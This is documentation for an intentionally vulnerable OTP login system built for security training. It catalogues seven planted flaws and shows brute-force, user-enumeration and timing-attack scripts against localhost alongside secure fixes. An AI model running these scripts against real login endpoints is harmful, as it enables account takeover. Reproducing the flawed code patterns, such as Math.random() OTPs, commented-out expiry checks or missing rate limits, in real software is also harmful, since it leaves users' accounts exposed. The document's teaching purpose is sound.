# OTP Login Vulnerabilities Documentation

This document details all the security vulnerabilities intentionally implemented in the OTP (One-Time Password) login system for educational and testing purposes.

> [!CAUTION]
> **DO NOT USE IN PRODUCTION!** This implementation contains severe security flaws that would compromise user accounts in a real application.

## Overview

The OTP login system has been implemented with **7 major vulnerabilities** based on real-world security issues reported on HackerOne and other bug bounty platforms. Each vulnerability is exploitable and demonstrates common mistakes in 2FA/OTP implementations.

---

## Vulnerability #1: OTP Disclosure in API Response

### Description
The OTP code is returned directly in the API response when requested, instead of being sent via a secure channel (email/SMS).

### Location
- **Backend**: `server/src/controllers/auth.controller.ts` - `requestOTP()` function
- **Frontend**: `client/src/pages/Login.tsx` - Displays OTP in yellow warning box

### How to Exploit
1. Navigate to the login page
2. Click "OTP Login" tab
3. Enter any registered email address
4. Click "Request OTP"
5. **The OTP is displayed directly in the UI**
6. Open Browser DevTools → Network tab
7. Find the `request-otp` request
8. View the response - the OTP is in plain text in the JSON response

### Expected Behavior (Secure)
The OTP should be sent via email or SMS to the user's registered contact method. The API should only return a success message like "OTP sent to your email" without disclosing the actual code.

### Impact
**Critical** - Anyone who can intercept the API response (MITM attack, compromised network, browser extensions) can see the OTP and bypass authentication.

---

## Vulnerability #2: Weak OTP Generation

### Description
The OTP uses only 4 digits generated with `Math.random()`, making it predictable and easily brute-forceable.

### Location
- **Backend**: `server/src/controllers/auth.controller.ts` - Line ~217
  ```typescript
  const otp = Math.floor(1000 + Math.random() * 9000).toString();
  ```

### How to Exploit
1. Request an OTP for a target account
2. The OTP space is only 10,000 possibilities (0000-9999)
3. Combined with no rate limiting (Vulnerability #3), an attacker can try all combinations
4. `Math.random()` is not cryptographically secure and can be predicted

### Expected Behavior (Secure)
- Use at least 6-8 digits
- Use cryptographically secure random number generation (e.g., `crypto.randomBytes()`)
- Consider alphanumeric codes for larger keyspace

### Impact
**High** - The small keyspace combined with predictable generation makes brute-force attacks trivial.

---

## Vulnerability #3: No Rate Limiting

### Description
There is no limit on the number of OTP verification attempts. An attacker can try unlimited combinations.

### Location
- **Backend**: `server/src/controllers/auth.controller.ts` - `verifyOTP()` function
- No rate limiting middleware is applied to the `/auth/verify-otp` endpoint

### How to Exploit

**Using Browser DevTools:**
1. Request an OTP for any account
2. Open Browser DevTools → Console
3. Run this script to brute-force:
```javascript
for (let i = 1000; i <= 9999; i++) {
  fetch('http://localhost:3000/api/auth/verify-otp', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'victim@example.com', otp: i.toString() })
  })
  .then(r => r.json())
  .then(data => {
    if (data.token) {
      console.log('SUCCESS! OTP:', i, 'Token:', data.token);
    }
  });
}
```

**Using curl:**
```bash
for i in {1000..9999}; do
  curl -X POST http://localhost:3000/api/auth/verify-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"$i\"}" \
    | grep -q "token" && echo "Found OTP: $i" && break
done
```

### Expected Behavior (Secure)
- Limit to 3-5 verification attempts per OTP
- Implement account lockout after failed attempts
- Add exponential backoff delays
- Use CAPTCHA after multiple failures

### Impact
**Critical** - Combined with weak OTP generation, this allows complete account takeover through brute-force.

---

## Vulnerability #4: OTP Reuse

### Description
Once an OTP is used successfully, it is not invalidated. The same OTP can be used multiple times.

### Location
- **Backend**: `server/src/controllers/auth.controller.ts` - `verifyOTP()` function
- Missing code to set `otp: null` after successful verification

### How to Exploit
1. Request an OTP for your account
2. Login successfully using the OTP
3. Logout
4. **Use the same OTP again to login** - it still works!
5. This OTP can be used indefinitely

### Expected Behavior (Secure)
After successful OTP verification, the OTP should be immediately invalidated:
```typescript
await prisma.user.update({
  where: { id: user.id },
  data: { otp: null, otpExpires: null }
});
```

### Impact
**High** - If an OTP is intercepted or leaked, it can be used multiple times, even after the legitimate user has logged in.

---

## Vulnerability #5: Infinite OTP Validity

### Description
The OTP expiration check is disabled. OTPs never expire, even though an expiration time is set.

### Location
- **Backend**: `server/src/controllers/auth.controller.ts` - `verifyOTP()` function
- Lines ~283-286 (commented out):
  ```typescript
  // if (user.otpExpires && new Date() > user.otpExpires) {
  //     return res.status(400).json({ message: 'OTP has expired. Please request a new one.' });
  // }
  ```

### How to Exploit
1. Request an OTP
2. Wait several hours, days, or even weeks
3. The OTP will still work
4. You can even modify the system time to test this

### Expected Behavior (Secure)
OTPs should expire after a short time window (typically 5-15 minutes):
```typescript
if (user.otpExpires && new Date() > user.otpExpires) {
    return res.status(400).json({ message: 'OTP has expired' });
}
```

### Impact
**Medium-High** - Extends the window of opportunity for attackers. If an OTP is intercepted, the attacker has unlimited time to use it.

---

## Vulnerability #6: User Enumeration

### Description
The API returns different error messages for existing vs non-existing users, allowing attackers to enumerate valid email addresses.

### Location
- **Backend**: `server/src/controllers/auth.controller.ts` - `requestOTP()` function
- Lines ~204-209

### How to Exploit

**Test with existing user:**
```bash
curl -X POST http://localhost:3000/api/auth/request-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"existing@example.com"}'
```
Response: `{"message": "OTP generated successfully", ...}`

**Test with non-existing user:**
```bash
curl -X POST http://localhost:3000/api/auth/request-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@example.com"}'
```
Response: `{"message": "No account found with this email address", "exists": false}`

**Automated enumeration:**
```bash
for email in user1@test.com user2@test.com admin@test.com; do
  response=$(curl -s -X POST http://localhost:3000/api/auth/request-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$email\"}")
  
  if echo "$response" | grep -q "exists.*false"; then
    echo "$email - NOT FOUND"
  else
    echo "$email - EXISTS"
  fi
done
```

### Expected Behavior (Secure)
Always return the same generic message regardless of whether the user exists:
```typescript
res.json({ message: 'If an account exists with this email, an OTP has been sent.' });
```

### Impact
**Medium** - Allows attackers to build a list of valid user accounts for targeted attacks.

---

## Vulnerability #7: Response Timing Attack

### Description
The server adds an artificial 500ms delay for existing users, creating a timing difference that reveals whether an email is registered.

### Location
- **Backend**: `server/src/controllers/auth.controller.ts` - `requestOTP()` function
- Line ~212:
  ```typescript
  await new Promise(resolve => setTimeout(resolve, 500));
  ```

### How to Exploit

**Manual timing test:**
```bash
# Non-existent user (fast response)
time curl -X POST http://localhost:3000/api/auth/request-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@example.com"}'

# Existing user (slow response - 500ms+ delay)
time curl -X POST http://localhost:3000/api/auth/request-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"existing@example.com"}'
```

**Automated timing analysis:**
```python
import requests
import time

def check_user_exists(email):
    start = time.time()
    response = requests.post(
        'http://localhost:3000/api/auth/request-otp',
        json={'email': email}
    )
    elapsed = time.time() - start
    
    # If response takes > 400ms, user likely exists
    return elapsed > 0.4

emails = ['user1@test.com', 'user2@test.com', 'admin@test.com']
for email in emails:
    exists = check_user_exists(email)
    print(f"{email}: {'EXISTS' if exists else 'NOT FOUND'}")
```

### Expected Behavior (Secure)
All responses should take the same amount of time regardless of whether the user exists. Add constant-time delays or use asynchronous processing.

### Impact
**Low-Medium** - Provides another method for user enumeration, even if error messages are fixed.

---

## Testing the Vulnerabilities

### Setup
1. Start the application:
   ```bash
   ./start_tunnels.sh
   ./deploy.sh all
   ```

2. Register a test account:
   - Navigate to `/register`
   - Create an account with email: `test@example.com`

### Test Checklist

- [ ] **Vulnerability #1**: Check if OTP appears in UI and API response
- [ ] **Vulnerability #2**: Verify OTP is only 4 digits
- [ ] **Vulnerability #3**: Try 100+ verification attempts (no rate limit)
- [ ] **Vulnerability #4**: Use same OTP multiple times
- [ ] **Vulnerability #5**: Use OTP after waiting 30+ minutes
- [ ] **Vulnerability #6**: Compare error messages for existing vs non-existing emails
- [ ] **Vulnerability #7**: Measure response times for existing vs non-existing emails

---

## Secure Implementation Guidelines

To fix these vulnerabilities in a production system:

1. **Never expose OTPs** in API responses or logs
2. **Use strong OTP generation**: 6-8 digits with crypto-secure randomness
3. **Implement rate limiting**: Max 3-5 attempts per OTP
4. **Invalidate OTPs** immediately after use
5. **Enforce expiration**: 5-15 minute validity window
6. **Prevent enumeration**: Generic error messages and constant-time responses
7. **Add additional security**: CAPTCHA, device fingerprinting, IP monitoring
8. **Use established libraries**: Consider libraries like `speakeasy` or `otplib`

---

## References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [HackerOne 2FA Bypass Reports](https://hackerone.com/reports?q=2fa+bypass)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
